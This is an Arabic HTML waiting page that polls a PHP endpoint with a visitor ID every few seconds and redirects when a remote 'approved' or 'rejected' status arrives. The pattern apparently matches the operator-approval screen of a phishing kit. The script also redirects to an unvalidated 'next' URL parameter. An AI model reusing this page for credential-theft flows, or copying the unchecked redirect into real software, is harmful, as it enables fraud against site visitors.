<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري المعالجة...</title>
    <style>
        body, html { height: 100%; margin: 0; display: flex; justify-content: center; align-items: center; background-color: #ffffff; font-family: 'Cairo', sans-serif; }
        .loader-container { display: flex; flex-direction: column; align-items: center; }
        .spinner { width: 80px; height: 80px; border: 5px solid #f3f3f3; border-top: 5px solid #8b1538; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .logo { width: 120px; margin-bottom: 10px; }
        .text { color: #333; font-weight: 600; }
    </style>
</head>
<body>
<div class="loader-container">
    <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663234476152/DhrsVnFpSCHlBdiR.png" alt="Logo" class="logo">
    <div class="spinner"></div>
    <div class="text">جاري التحقق من البيانات...</div>
</div>
<script>
    const urlParams = new URLSearchParams(window.location.search);
    const visitorId = urlParams.get('visitor_id');
    const nextPage = urlParams.get('next');

    function checkStatus() {
        fetch(`api/check_status.php?visitor_id=${visitorId}`)
            .then(response => response.json())
            .then(data => {
                if (data.status === 'approved') {
                    window.location.href = nextPage + "?visitor_id=" + visitorId;
                } else if (data.status === 'rejected') {
                    const prevPage = document.referrer.split('/').pop().split('?')[0] || 'index.php';
                    window.location.href = prevPage + "?visitor_id=" + visitorId + "&error=1";
                }
            })
            .catch(error => console.error('Error:', error));
    }
    setInterval(checkStatus, 3000);
</script>
</body>
</html>
